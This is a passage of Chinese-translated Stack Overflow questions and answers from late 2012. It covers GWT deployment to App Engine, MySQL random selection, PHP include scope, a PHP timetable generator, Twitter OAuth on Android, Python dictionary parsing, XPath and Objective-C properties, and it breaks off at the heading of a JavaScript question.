> 时间：2012-12-31T05:46:50.783

您将获得 404。**恐怖！！！！**

目前只有 /deploy/ 文件夹可以忽略，war/gwtmodule 不能。

所有 gwt 生成的脚本都在 war/gwtmodule 中，您需要在每次编译时将它们上传到 appengine。

这些是在编译阶段的每个构建中生成的，因此不会检查到 svn 中。

**它们需要位于 APP Engine 的部署文件夹中。**

我建议您通过 GWT [https://developers.google.com/web-toolkit/doc/latest/tutorial/appengine阅读 GWT 团队关于 App Engine 的优秀文档](https://developers.google.com/web-toolkit/doc/latest/tutorial/appengine)

编辑 - 基于浏览器 * 语言排列`<modulename>.nocache.js`加载。`<longnumeric>.cache.html`GWT 编译您的 java 代码以创建`<modulename>.nocache.js`相关的 cache.html 文件。cache 和 nocache 指示浏览器是否应该缓存文件。

您将在您的 html 文件中为 gwtapp 提供 .nocache.js 脚本引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:17:59.407

GWT 编译器为每个排列构建不同的 javascript 文件是正常的。排列是针对特定用户代理（浏览器，例如 ie9 gecko (ff)、webkit (chrome/safari)）和语言（英语、法语）。所以你已经正确上传了 chrome 浏览器的所有输出文件，大概是英文的。正如您所说，您似乎正在从上传中过滤掉其他文件，并且在对英文版 Firefox 使用不同的排列时会请求其中一些文件。您应该尽量不要过滤这些文件。

# mysql - MySQL：从每列返回随机值

> ID：14097072
> 
> 赞同：2
> 
> 时间：2012-12-31T03:21:09.423
> 
> 标签：mysql

*注意：这可能是一个奇怪的问题。*

我有一个包含名字和姓氏的表，其架构如下（表名：**random_names**）：

```
id          INT             PRIMARY, AUTO INCREMENT
first_name  VARCHAR(100)    NOT NULL
last_name   VARCHAR(100)    NOT NULL 
```

我想使用查询从`first_name`和中获取随机值`last_name`。目前我使用 2 个查询来获取值：

```
SELECT first_name FROM random_names ORDER BY rand()
SELECT last_name FROM random_names ORDER BY rand() 
```

但我希望我可以在 1 个结果输出中输出随机结果列表。我错过了什么 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T03:30:39.827

```
select
    (select first_name from random_names order by rand() limit 1) as random_first_name, 
    (select last_name from random_names order by rand() limit 1) as random_last_name; 
```

虽然对于任何大小的表，如果您以编程方式确定条目数并为每列选择一个随机偏移量，它会更快：

```
select
    (select first_name from random_names order by rand() limit $first_name_offset,1) as random_first_name, 
    (select last_name from random_names order by rand() limit $last_name_offset,1) as random_last_name; 
```

其中偏移量是从 0 到比 的结果小一的随机数`select count(*) from random_names`。

后续问题：

> 但是如何列出结果计数等于原始表中的值的数量？（就像打乱表中的数据一样）

我会这样做：

```
create temporary table rand_last (id int(11) primary key auto_increment, last_name text) select last_name from random_names order by rand();
create temporary table rand_first (id int(11) primary key auto_increment, first_name text) select first_name from random_names order by rand();
select first_name, last_name from rand_first inner join rand_last using (id); 
```

或者可能像这样（假设 random_names 有一个 'id' 主键）：

```
create temporary table rand_one (id int(11) primary key auto_increment, random_names_id int(11)) select id random_names_id from random_names order by rand();
create temporary table rand_two (id int(11) primary key auto_increment, random_names_id int(11)) select id random_names_id from random_names order by rand();
select rand_first.first_name, rand_last.last_name from rand_one inner join rand_two using (id) inner join random_names rand_first on rand_one.random_names_id=rand_first.id inner join random_names rand_last on rand_two.random_names_id=rand_last.id; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:47:41.087

你也可以这样做-

```
SELECT first_name, last_name FROM random_names ORDER BY rand() 
```

或者

```
SELECT concat(first_name," ",last_name) fullname FROM random_names ORDER BY rand() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T03:36:36.357

您可以通过以下查询以随机顺序获取所有可能的对`first_name`和：`last_name`

```
select *
from (select first_name from random_names) a,
     (select last_name from random_names) b
order by rand(); 
```

# c# - Windows Phone Toast 通知未显示

> ID：14097077
> 
> 赞同：2
> 
> 时间：2012-12-31T03:21:58.470
> 
> 标签：c#, windows-phone-7.1, windows-phone, windows-phone-8

我有一个 toast 通知设置为在我的应用程序中的设定时间显示。当那个时间到来时，toast 不会显示，即使应用程序没有在前台运行。当应用程序未在前台运行时，我该怎么做才能使 toast 显示？我也知道当应用程序在前台运行时吐司不会显示，因为它是这样设置的。但是当我在开始屏幕上时它也不会显示。

```
ShellToast toast = new ShellToast();
toast.Title = "Title";
toast.Content = "The Time has come!";
toast.Show(); 
```

所以基本上我的问题是如何在应用程序未在前台运行时显示 toast 通知（此外，当我进入开始屏幕时应用程序是否还在运行？）感谢您的任何回答！

# php - PHP 包括类中的文件

> ID：14097078
> 
> 赞同：3
> 
> 时间：2012-12-31T03:22:07.570
> 
> 标签：php

只是一个简单的问题，但我一直在研究一个小型 MVC 框架并注意到了一些东西。

例如：

--PHP文件--

```
class loadFiles{
        function __construct($file = NULL){
        include $file . '.php';
        }
}
$loadfiles = new $loadFiles('crucialsettings');
echo $randomstring; //Throws an error 
```

--crucialsettings.php--

```
<?php
    $randomstring = 'hello';
?> 
```

我只是意识到包含在对象范围内的文件无法从全局范围访问。将文件包含在对象中以便可以全局访问的最佳方法是什么？

我希望能够：

```
$loadfiles->settings();
$loadfiles->classes();
$loadfiles->passwords(); 
```

我想构建一个处理全局文件包含的类。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:32:20.700

在 PHP 中包含或要求代码的位置无关紧要。解释器在它的第一个定义过程中是非常线性的，也就是说，它基本上会将所有包含/需要的文件按照读取方式的确切顺序压缩到一个大文件中。

关于这一点需要注意的一件事是范围确实发生了变化。但一切都适用于“全球”范围。您始终可以使用“global”关键字将全局范围中的某些内容导入当前范围，以便在使用之前声明一个变量。因此，当您想使用另一个脚本中的“全局”变量时，只需请求它即可。

一个小例子...

**一个.php**

```
include('b.php');
global $myVar;
echo $myVar; 
```

**b.php**

```
include('c.php'); 
```

**c.php**

```
$myVar = 'Hello World'; 
```

**解释器在第一次通过后看到的是这段代码**

```
// In global scope
$myVar = 'Hello World'

// In a.php scope
global $myVar;
echo $myVar; 
```

简而言之，从您的 php 文件中只需添加该行

```
global $randomstring; 
```

包含criticalsettings.php 文件后，您的回声将起作用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T05:21:46.977

看来您的框架过于依赖非 OOP 的内部结构。这不是一种更可取的构建方式，但您**可以**通过循环浏览变量列表并使它们成为您的类/实例范围的一部分来做您想做的事情。这里一个相当有用的函数是[get_defined_vars();](http://php.net/manual/en/function.get-defined-vars.php)

假设您有文件 a.php、b.php 和 c.php。每个看起来像这样：

**一个.php**：`<?php $a = "AAAAAA";`

**b.php**：`<?php $b = "BBBBBBBBBB";`

**c.php**：`<?php $c = "CCCCCCCCCCCCCCCCCCCCCCCCCCC";`

```
class mystuff {
    function include_with_vars( $____file ) {

        // grab snapshot of variables, exclude knowns
        $____before = get_defined_vars();
        unset( $____before['____file'] );

        // include file which presumably will add vars
        include( $____file );

        // grab snapshot of variables, exclude knowns again
        $____after = get_defined_vars();
        unset( $____after['____file'] );
        unset( $____after['____before'] );

        // generate a list of variables that appear to be new
        $____diff = array_diff( $____after, $____before );

        // put all local vars in instance scope
        foreach( $____diff as $variable_name => $variable_value ) {
            $this->$variable_name = $variable_value;
        }
    }

    function __construct($file = NULL){
        $this->include_with_vars( "a.php" );
        $this->include_with_vars( "b.php" );
        $this->include_with_vars( "c.php" );
    }
}

$t = new mystuff();
echo "<PRE>"; 
print_r( $t ); 
```

该程序现在将从您的 include() 指令中获取局部变量并将它们放在类范围内：

```
mystuff Object
(
    [a] => AAAAAA
    [b] => BBBBBBBBBB
    [c] => CCCCCCCCCCCCCCCCCCCCCCCCCCC
) 
```

换句话说，文件 a.php( `$a`) 中的局部变量现在是`$t->a`.

# java - Twitter OAuth 回调似乎在 Android 中不起作用

> ID：14097085
> 
> 赞同：1
> 
> 时间：2012-12-31T03:23:34.173
> 
> 标签：java, android, twitter, twitter-oauth

我整天都在尝试将我的应用程序连接到 android，但我没有运气。我一直在寻找几个小时，但我找到的所有资源要么不完整，要么已经过时。到目前为止我有这个：

```
private class MyAsync extends AsyncTask<Void, Void, AccessToken> {

    @Override
    protected AccessToken doInBackground(Void... params) {
        try {
            requestToken = twitter.getOAuthRequestToken();
            Intent browserIntent = new Intent(Intent.ACTION_VIEW,
                    Uri.parse(requestToken.getAuthorizationURL()));
            startActivity(browserIntent);
        } catch (TwitterException e) {

            e.printStackTrace();
        }
        Log.d("token", "here1");
        return token;
    }

} 
```

就打开授权页面而言，上述方法有效。但是，当我添加回调 URL（如下所示）时，应用程序停止工作。它甚至不再打开浏览器：

```
twitter.getOAuthRequestToken("myapp://callback"); 
```

我在某处读到我应该将以下意图过滤器添加到清单文件中。但这并不影响结果：

```
 <intent-filter>
            <action android:name="android.intent.action.VIEW" />
            <category android:name="android.intent.category.DEFAULT" />
            <category android:name="android.intent.category.BROWSABLE" />
            <data android:scheme="myapp" android:host="callback" />
        </intent-filter> 
```

如果有帮助，我正在使用 twitter4j 库。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T15:33:04.407

好，我知道了。我所要做的就是在应用程序的推特页面中插入一个虚拟回调 URL。这种反直觉和丑陋的解决方案。

# python - 如何在python中以字典形式拆分文本文件

> ID：14097091
> 
> 赞同：2
> 
> 时间：2012-12-31T03:25:24.560
> 
> 标签：python, centos, urllib2

我有这个文本文件

```
application/andrew-inset                        ez
application/applixware                          aw
application/atom+xml                            atom
application/atomcat+xml                         atomcat
application/atomsvc+xml                         atomsvc
application/ccxml+xml                           ccxml
application/cdmi-capability                     cdmia
application/cdmi-container                      cdmic
image/jpeg                                      jpeg jpg jpe 
```

我想转换成键值对的python字典。我怎样才能做到这一点。

如果有多个值，我也很困惑我应该怎么做。

我想从 mimetypes 中获取文件扩展名

所以基本上在多重价值的情况下我想得到第一个。

例如

`mydict['image/jpeg']`应该返回`jpeg`

这就是我所追求的

```
import shlex
f = open("mimetypes.txt","r")
mydict = dict()
for line in f:
        k,v = shlex.split(line.strip())
        mydict[k.strip()] =  v.strip()

f.close()
f2 = open("mimetest.txt","w")
f2.write(mydict)
f2.close() 
```

我明白了

```
Traceback (most recent call last):
  File "makedict.py", line 5, in <module>
    k,v = shlex.split(line.strip())
ValueError: too many values to unpack 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T03:31:17.550

**编辑：**根据您的更新，您非常接近 - 问题是因为这一行：

```
k,v = shlex.split(line.strip()) 
```

如您所知，它适用于具有两个项目的任何元素，但是当您拥有多个项目时问题就来了。例如：

```
In [1]: import shlex

In [2]: line = 'one two'

In [3]: k,v = shlex.split(line.strip())

In [4]: print k, v
one two

In [5]: line = 'one two three'

In [6]: k,v = shlex.split(line.strip())
---------------------------------------------------------------------------
ValueError                                Traceback (most recent call last)

/<ipython console> in <module>()

ValueError: too many values to unpack 
```

发生的事情是您试图使用包含三个项目的列表来分配两个变量，这会给您带来该错误。您可以在代码中做的一件事是通过执行以下操作将返回的列表限制为仅返回两项：

```
In [7]: line = 'one two three'

In [8]: k,v = shlex.split(line.strip())[:2]

In [9]: print k, v
one two 
```

* * *

一般的想法是你创建一个字典，打开文件，然后在每一行，去掉尾随的换行符，在空格上分割并取结果列表的前两个元素：

```
In [5]: d = {}

In [6]: with open('mime.txt', 'rb') as f:
   ...:     for line in f:
   ...:         mime, val = line.strip().split()[:2]
   ...:         d[mime] = val
   ...:         
   ...:         

In [7]: d
Out[7]: 
{'application/andrew-inset': 'ez',
 'application/applixware': 'aw',
 'application/atom+xml': 'atom',
 'application/atomcat+xml': 'atomcat',
 'application/atomsvc+xml': 'atomsvc',
 'application/ccxml+xml': 'ccxml',
 'application/cdmi-capability': 'cdmia',
 'application/cdmi-container': 'cdmic',
 'image/jpeg': 'jpeg'}

In [8]: d['image/jpeg']
Out[8]: 'jpeg' 
```

如果您需要存储所有项目，您可以这样做：

```
In [1]: d = {}

In [2]: with open('mime.txt', 'rb') as f:
   ...:     for line in f:
   ...:         line = line.strip().split()
   ...:         d[line[0]] = line[1:]
   ...:         
   ...:         

In [3]: d
Out[3]: 
{'application/andrew-inset': ['ez'],
 'application/applixware': ['aw'],
 'application/atom+xml': ['atom'],
 'application/atomcat+xml': ['atomcat'],
 'application/atomsvc+xml': ['atomsvc'],
 'application/ccxml+xml': ['ccxml'],
 'application/cdmi-capability': ['cdmia'],
 'application/cdmi-container': ['cdmic'],
 'image/jpeg': ['jpeg', 'jpg', 'jpe']} 
```

这包括所有的 MIME 类型，所以如果你只想要第一个，你可以调用给定类型值的第一个元素：

```
In [4]: d['image/jpeg'][0]
Out[4]: 'jpeg 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T03:44:47.707

另一种方法是：

```
dic = {}
file =  open("filename","r")
contents = file.readlines()
for content in contents:
    value = filter(lambda a: a !='',content.split(" "))
    dic[value[0]] = value[1]
file.close()
print dic['image/jpeg'] 
```

我们用“”分割每一行，然后删除列表中的任何“”。然后我们为字典分配值。

# php - 在循环触发时在php中查询，但给出一个变量的结果

> ID：14097094
> 
> 赞同：1
> 
> 时间：2012-12-31T03:26:33.227
> 
> 标签：php, mysql, timetable

![在此处输入图像描述](../Images/89f4acfbac6c83f50a73c1cdf6125a89.png)我有一个时间表应用程序，它需要根据学期一次性为所有教师生成时间表。我正在查询教师 ID，并且在 while 循环中，我使用了用于生成单个教师时间表的相同代码。根据 mysql 日志，正在为每个教师 ID 触发查询，但正在为所有教师生成相同的时间表。我检查了每一行代码，但它不知何故不起作用。

我很坚持这一点，请帮助。

我的PHP代码：

```
<?php
include ("includes/functions.php");
$timespan = mysql_real_escape_string($_GET['timespan']);

$q11 = "select * from teachers order by teacher";
$r11 = mysql_query($q11) or die(mysql_error());
while($rows11 = mysql_fetch_array($r11)){

$teacher = $rows11['id'];

$array_day=array('Mon' => 0, 'Tue' => 1, 'Wed' => 2, 'Thu' => 3, 'Fri' => 4, 'Sat' =>      5);

if($timespan=="BS"){
 $qs="";
}
else if ($timespan=="MS"){
 $qs=" and (partno='1' or partno='3' or partno='5' or partno='9') ";
}
else if ($timespan=="WS"){
$qs=" and (partno='2' or partno='4' or partno='6' or partno='9') ";
}
else if ($timespan=="1"){
$qs=" and partno='1' ";
}
else if ($timespan=="2"){
$qs=" and partno='2' ";
}
else if ($timespan=="3"){
$qs=" and partno='3' ";
}
else if ($timespan=="4"){
$qs=" and partno='4' ";
}
else if ($timespan=="5"){
$qs=" and partno='5' ";
}
else if ($timespan=="6"){
$qs=" and partno='6' ";
}
else if ($timespan=="7"){
$qs=" and partno='7' ";
}
else if ($timespan=="8"){
$qs=" and partno='8' ";
}
else if ($timespan=="10"){
$qs=" and partno='1' ";
}
else if ($timespan=="11"){
 $qs=" and partno='2' ";
}
else if ($timespan=="9"){
$qs=" and partno='9' ";
}

if($qs==""){
$q1="SELECT tt.day as day, tt.period as period, tt.egstatus as egstat, tt.resp_id as id,    tt.sub_group, tt.filter, c.shortname as c_s, p.shortname as p_s, tt.teacherid, tt.subjectid as subject, r.room as room, t.apd1 as apd1, t.apd2 as apd2, g.groupname as class,  t.teacher as teacher, p.courseid as course, p.partno as part FROM course c, papers p, ttresponsibility tt, teachers t, groups g, rooms r  where c.id=p.courseid and p.paperid = tt.subjectid and tt.teacherid= t.id and tt.room=r.room_id and tt.groupname=g.group_id and tt.teacherid = '$teacher' order by tt.day,tt.period,p.partno ASC";
}else{
$q1="SELECT tt.day as day, tt.period as period, tt.egstatus as egstat, tt.resp_id as id, tt.sub_group, tt.filter, c.shortname as c_s, p.shortname as p_s, tt.teacherid, tt.subjectid as subject, r.room as room, t.apd1 as apd1, t.apd2 as apd2, g.groupname as class,  t.teacher as teacher, p.courseid as course, p.partno as part FROM course c, papers p, ttresponsibility tt, teachers t, groups g, rooms r  where c.id=p.courseid and p.paperid = tt.subjectid and tt.teacherid= t.id and tt.room=r.room_id and tt.groupname=g.group_id and tt.teacherid = '$teacher'" .$qs. " order by tt.day,tt.period,p.partno ASC";
}

$r1 = mysql_query($q1) or die ("responsibility fetch error:" .mysql_error());

if(mysql_num_rows($r1) > 0){
$q2 = "select teacher,name2,type from teachers where id = '$teacher'";
$r2 = mysql_query($q2) or die("teacher fetch error:" .mysql_error());
$rows1 = mysql_fetch_array($r2);
//$num = mysql_num_rows($r1);

echo "<table width=100% style='border:0px ;font-family:arial;font-size:10px; border-  collapse:collapse;cellspacing:0;padding:0px;'><tr><td width=50% align=left border=0 style='border:0px ;font-family:arial;font-size:10px; border-collapse:collapse;cellspacing:0;padding:0px;'>Dated: 31st July 2012</td><td  style='border:0px ;font-family:arial;font-size:10px; border-collapse:collapse;cellspacing:0;padding:0px;' width=50% align=right border=0>Version 2.0</td></tr></table>";

echo "<center><font size=5><strong>Shri Ram College of Commerce</strong></font></center>";

echo "<br>";

echo "<table width=100%><tr><td align=left  style='border:0px ;font-family:arial;font-size:10px; border-collapse:collapse;cellspacing:0;padding:0px;' ><font size=4><strong>Teacher: ";
if($rows1['type']==1){
echo "".$rows1['name2']."";
}else{
echo "".$rows1['teacher']."";
}
echo "</strong></h3></font></b></td>";
if ($timespan=="MS"){
echo "<td align=right  style='border:0px ;font-family:arial;font-size:10px; border-collapse:collapse;cellspacing:0;padding:0px;'><font size=4><strong>Time Span: Monsoon Term</strong></font></br></td></tr></table>";
}
else if ($timespan=="WS"){
echo "<td align=right  style='border:0px ;font-family:arial;font-size:10px; border-     collapse:collapse;cellspacing:0;padding:0px;'><font size=4><strong>Time Span: Winter Term</strong></font></br></td></tr></table>";
}
echo "<br>";

echo "<table width='100%' border='1' class='tt'>";

echo "<tr class='heads'>";
echo "<td rowspan='2' style='padding:0;text-align:center; width:1%;'>  <b>Period<br>Time</b></td>";
echo "<td style='padding:0;text-align:center; '><b>I</b></td>";
echo "<td style='padding:0;text-align:center; '><b>II</b></td>";
echo "<td style='padding:0;text-align:center; '><b>III</b></td>";
echo "<td style='padding:0;text-align:center; '><b>IV</b></td>";
echo "<td style='padding:0;text-align:center; '><b>V</b></td>";
echo "<td style='padding:0;text-align:center; width:1%;' ><b>Break</b></td>";
echo "<td style='padding:0;text-align:center; '><b>VI</b></td>";
echo "<td style='padding:0;text-align:center; '><b>VII</b></td>";
echo "<td style='padding:0;text-align:center; '><b>VIII</b></td>";
echo "<td style='padding:0;text-align:center; '><b>IX</b></td>";
 echo "</tr>";
 echo "<tr class='heads'>";
echo "<td style='padding:0;text-align:center; '><b>8:40 AM</b></td>";
echo "<td style='padding:0;text-align:center; '><b>9:35 AM</b></td>";
echo "<td style='padding:0;text-align:center; '><b>10:30 AM</b></td>";
echo "<td style='padding:0;text-align:center; '><b>11:25 AM</b></td>";
echo "<td style='padding:0;text-align:center; '><b>12:20 PM</b></td>";
echo "<td style='padding:0;text-align:center; '><b>1:15 PM</b></td>";
echo "<td style='padding:0;text-align:center; '><b>2:00 PM</b></td>";
echo "<td style='padding:0;text-align:center; '><b>2:55 PM</b></td>";
echo "<td style='padding:0;text-align:center; '><b>3:50 PM</b></td>";
echo "<td style='padding:0;text-align:center; '><b>4:45 PM</b></td>";
echo "</tr>";

$k="ToFetchNextRow";
$l = 0;
$rowToProcess=0;
$toRepeat=1;
$num=mysql_num_rows($r1);
$num1=$num-1;    

for($i=0;$i<=5;$i++){

$day = array_search($i, $array_day);

echo "<tr class='period'><td style='padding:0;text-align:center;'>    
<b>".$day."</b></td>";
for($j=0;$j<=8;$j++){
if($i==0 and $j==5){
  echo "<td style='xycell' rowspan=6 >&nbsp;</td>";
 }

 $noOfEntriesAddedInThisCell=0;
 $toRepeat=1;
 while($toRepeat==1){
   $rows = mysql_fetch_array($r1);
   $data[] = $rows; // creating multidimensional array

   $dt = $data[$rowToProcess]['day']; 
   $period = $data[$rowToProcess]['period'];
   $paper = $data[$rowToProcess]['p_s'];
   $course = $data[$rowToProcess]['c_s'];
   $room = $data[$rowToProcess]['room'];
   $class = $data[$rowToProcess]['class'];
   $id = $data[$rowToProcess]['id'];
   $part = $data[$rowToProcess]['part'];
   $subgroup = $data[$rowToProcess]['sub_group'];
   $weekselector = $data[$rowToProcess]['filter'];
$egstatus = $data[$rowToProcess]['egstat'];  

    //process the row to be processed

    //add the cell entry if it is of interest
   if(($i+1) == $dt and ($j+1) == $period){
// check if the slot is busy
   if($egstatus == 1){

 echo "<td style='xycell' valign=center align=center  class='tt'><b><div style='border-   bottom:0px solid #bbb;padding:0;font-family:arial;font-size:11px'>   <center>Contact<br>Hour</center></td>";
   }
elseif($egstatus == 2){

echo "<td  style='xycell' valign=center align=center><b><div style='border-bottom:0px     solid #bbb;padding:0;font-family:arial;'><a class='slot' style='border-bottom:0px solid #ccc;' href='#' id='status".$dt."+".$period."' onclick='editSlot(".$dt.','.$period.','.$teacher.','.$id."); return false'>Busy</td>";
   }

elseif($egstatus == 0){
  $e = $i + 1;
      $f = $j + 1;
      if($noOfEntriesAddedInThisCell==0){
      echo "<td valign=center align=center style='border:2px solid #000;padding:0;font-family:arial;'";

      if($subgroup!=0){
        echo "class='orangeBlock'";
      }else{
        echo "class='yellowBlock'";
      }

      echo "><b>";
      }
      echo "<table class='' style='border:0px solid #000;font-family:arial;border-collapse:collapse;cellspacing:0;padding:0px;'>";
      echo "<tr>";

      echo "<td style='border-collapse:collapse;border:0px ;font-size:11px; font-family: arial, arial,helvetica, sans-serif;' valign='top'><b> ".$course."-".$part." ".$class."";

if($subgroup!=0){
echo "".$subgroup." "; 
}
echo "".$paper." ".$room."";

if($weekselector==1){
echo "(O)</td>";
}

if($weekselector==2){
echo "(E)</td>";
}

echo "</td></tr></table>";
     }
      $noOfEntriesAddedInThisCell = $noOfEntriesAddedInThisCell+1;

     if($rowToProcess < $num1){

       $rowToProcess=$rowToProcess+1;
     }else{ 
       $toRepeat=0;
     }

}else{
        if($noOfEntriesAddedInThisCell !=0){
        //close the internal table cell
        echo "</td>";
     }else{

  //fill the empty cell
       $r = $i + 1;
       $s = $j + 1;

       echo "<td  valign='top' class='tt'><br><br><br></td>";

  }
     $toRepeat=0;
   }

  }//while closing

 }//jloop closing

}// closing i
echo "</tr>";
echo "</table>";

echo "<br><br><br><br>";

echo "<table width=100% style='border:0px ;font-family:arial;font-size:11px; border-collapse:collapse;cellspacing:0;padding:0px;'>";

echo "<tr><td  style='border:0px ;font-family:arial;font-size:11px; border-collapse:collapse;cellspacing:0;padding:0px;' align=left style=font-size:11px> Convenor</td>  <td  style='border:0px ;font-family:arial;font-size:11px; border-collapse:collapse;cellspacing:0;padding:0px;' align=center style=font-size:11px>Teacher Incharge</td><td  style='border:0px ;font-family:arial;font-size:11px; border-collapse:collapse;cellspacing:0;padding:0px;' align=right style=font-size:11px>Principal</td></tr>";

echo "<tr><td  style='border:0px ;font-family:arial;font-size:11px; border-collapse:collapse;cellspacing:0;padding:0px;' align=left style=font-size:11px style='border-collapse:collapse;border:0px solid #000;'> Vikas Madan</td><td  style='border:0px ;font-family:arial;font-size:11px; border-collapse:collapse;cellspacing:0;padding:0px;' align=center style=font-size:11px>Amit Sachdeva</td><td  style='border:0px ;font-family:arial;font-size:11px; border-collapse:collapse;cellspacing:0;padding:0px;' align=right style=font-size:11px>P. C. Jain</td></tr>";

echo "</table>";

}

else{

echo "";
}

}

?> 
```

编辑的代码片段：

```
 while($toRepeat==1){
   while($rows = mysql_fetch_array($r1)){
   $data[] = $rows; // creating multidimensional array

   $dt = $data[$rowToProcess]['day']; 
   $period = $data[$rowToProcess]['period'];
   $paper = $data[$rowToProcess]['p_s'];
   $course = $data[$rowToProcess]['c_s'];
   $room = $data[$rowToProcess]['room'];
   $class = $data[$rowToProcess]['class'];
   $id = $data[$rowToProcess]['id'];
   $part = $data[$rowToProcess]['part'];
   $subgroup = $data[$rowToProcess]['sub_group'];
   $weekselector = $data[$rowToProcess]['filter'];
$egstatus = $data[$rowToProcess]['egstat'];  
 } 
```

和之后的输出。 ![在 colin 建议的编辑代码之后](../Images/8988ff311424703ff0c80fa9094979e6.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T03:43:08.657

您需要创建另一个 while 循环 while ($rows = mysql_fetch_array($r1)) { } 您目前在循环中没有这个，因此重复值。

* * *

把它排除在循环之外：

```
$array_day=array('Mon' => 0, 'Tue' => 1, 'Wed' => 2, 'Thu' => 3, 'Fri' => 4, 'Sat' =>      5); 
```

我不太确定你在问什么。你是什​​么意思它只有一个变量的结果。您的意思是循环中的第一个变量是唯一正确返回的变量，还是在第二个循环中没有正确返回变量？

# html - 图像 url 的 xpath 查询

> ID：14097097
> 
> 赞同：0
> 
> 时间：2012-12-31T03:27:16.097
> 
> 标签：html, objective-c, ios, image, xpath

我正在为我的校报编写一个应用程序，该应用程序完全通过 wordpress 在线运行。我正在使用 Hpple 来解析 html。从以下：

```
</div>
            <div id="fs-2" class="fs">
                <div id="fsh-2" class="fsh">
            <div id="fdh-2" class="fdh"><a href="http://www.mabearnews.com/entertainment/2012/12/26/hit-or-mis-les-miserables-review/">Hit or &#8216;Mis&#8217;: Les Miserables Review<br> by *******</a></div>
            <a href="http://www.mabearnews.com/entertainment/2012/12/26/hit-or-mis-les-miserables-review/"><img src="http://www.mabearnews.com/wp-content/uploads/2012/12/les-miserables-2012-wallpapers-les-miserables-2012-movie-32697313-1280-800-600x375.jpg" id="fph-2" class="fph" /></a> 
```

什么 xpath 查询字符串会返回图像 url (img src)？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T03:35:28.950

html 内容格式不正确。

假设这是正确的 html 内容：

```
<div id="fs-2" class="fs">
    <div id="fsh-2" class="fsh">
        <div id="fdh-2" class="fdh"><a href="http://www.mabearnews.com/entertainment/2012/12/26/hit-or-mis-les-miserables-review/">Hit or &#8216;Mis&#8217;: Les Miserables Review<br> by *******</a></div>
        <a href="http://www.mabearnews.com/entertainment/2012/12/26/hit-or-mis-les-miserables-review/"><img src="http://www.mabearnews.com/wp-content/uploads/2012/12/les-miserables-2012-wallpapers-les-miserables-2012-movie-32697313-1280-800-600x375.jpg" id="fph-2" class="fph" /></a>
    </div>
</div> 
```

您可以使用此 xpath 查询获取图像 URL：

```
//div[@id="fsh-2"]/a/img/@src 
```

# objective-c - 访问对象的属性作为方法的参数

> ID：14097102
> 
> 赞同：2
> 
> 时间：2012-12-31T03:27:37.557
> 
> 标签：objective-c, object, methods

我正在学习objective-c，所以请原谅我的无知。如何使用对象的属性作为该对象的实例方法的参数？例如，我创建了一个带有两个参数的对象 FamilyMember，名称和首选项（一个枚举）。如果我想将这些属性用作dinnerPrefMethod 方法的参数，该怎么做。这是我目前所拥有的，如您所见，如果我想调用该方法，我必须手动输入该人的偏好。我的目标是能够调用该方法，并将对象的两个属性作为参数。

```
@implementation FamilyMember

@synthesize name, preference;

-(void) dinnerPrefMethod : (dinnerPreference) x; {
    NSLog(@"Lets see what %@ wants for dinner", name);
    switch( x )
{
    case pizza:
        NSLog(@"%@ wants pizza", name);
        break;
    case steak:
        NSLog(@"%@ wants steak", name);
        break;
    case seafood:
        NSLog(@"%@ wants seafood", name);
        break;
    case dunno:
        NSLog(@"%@ doesn't know", name);
        break;
}
}
@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T03:49:26.873

正如我所看到的，您在其方法中使用了对象的属性。在这种情况下，您不必传递这些值，因为您可以直接访问它们。

* * *

**更新**

```
-(void) dinnerPrefMethod {
    NSLog(@"Lets see what %@ wants for dinner", self.name);
    switch(self.preference)
    {
    case pizza:
        NSLog(@"%@ wants pizza", self.name);
        break;
    case steak:
        NSLog(@"%@ wants steak", self.name);
        break;
    case seafood:
        NSLog(@"%@ wants seafood", self.name);
        break;
    case dunno:
        NSLog(@"%@ doesn't know", self.name);
        break;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T03:50:51.410

> 如果我想将这些属性用作dinnerPrefMethod 方法的参数，该怎么做。[...] 我的目标是能够调用该方法，并将对象的两个属性作为参数。

听起来您想避免这样做：

```
FamilyMember *familyMember = [[FamilyMember alloc] init];
[familyMember setName:@"First Last"];
[familyMember setPreference:dunno];
[familyMember announceDinnerPreference]; 
```

`-[FamilyMember announceDinnerPreference]`您的修改版本在哪里`dinnerPrefMethod:`：

```
- (void)announceDinnerPreference
{
    NSLog(@"Let's see what %@ wants for dinner...", [self name]);
    switch ([self preference]) {
        case pizza:
            NSLog(@"%@ wants pizza.", [self name]);
            break;
        case steak:
            NSLog(@"%@ wants steak.", [self name]);
            break;
        case seafood:
            NSLog(@"%@ wants seafood.", [self name]);
            break;
        case dunno:
            NSLog(@"%@ doesn't know.", [self name]);
            break;
    }
} 
```

也许你想定义一个方法`-[FamilyMember setName:preference:announceDinnerPreference:]`

```
- (void)setName:(NSString *)name preference:(dinnerPreference)preference announceDinnerPreference:(BOOL)announce
{
    [self setName:name];
    [self setPreference:preference];
    if (announce) {
        [self announceDinnerPreference];
    }
} 
```

这将允许你写

```
FamilyMember *familyMember = [[FamilyMember alloc] init];
[familyMember setName:@"First Last" preference:dunno announceDinnerPreference:YES]; 
```

不过，坦率地说，这在风格上非常奇怪。

* * *

一种更时尚的方法是定义`-initWithName:preference:`

```
- (id)initWithName:(NSString *)name preference:(dinnerPreference)preference
{
    self = [super init];
    if (self) {
        [self setName:name];
        [self setPreference:preference];
    }
    return self;
} 
```

然后你就可以写了

```
FamilyMember *familyMember = [[FamilyMember alloc] initWithName:@"First Last" preference:dunno];
[familyMember announceDinnerPreference]; 
```

* * *

> 所以我可以在方法中使用对象的属性而不说它们是参数吗？

是的。对象的实例变量可以在其实例方法中访问。

# javascript - 在页面加载时调用 javascript

> ID：14097104
> 
> 赞同：0
> 
> 时间：2012-12-31T03:27:55.287
> 
> 标签：javascript, onload, states, maqetta

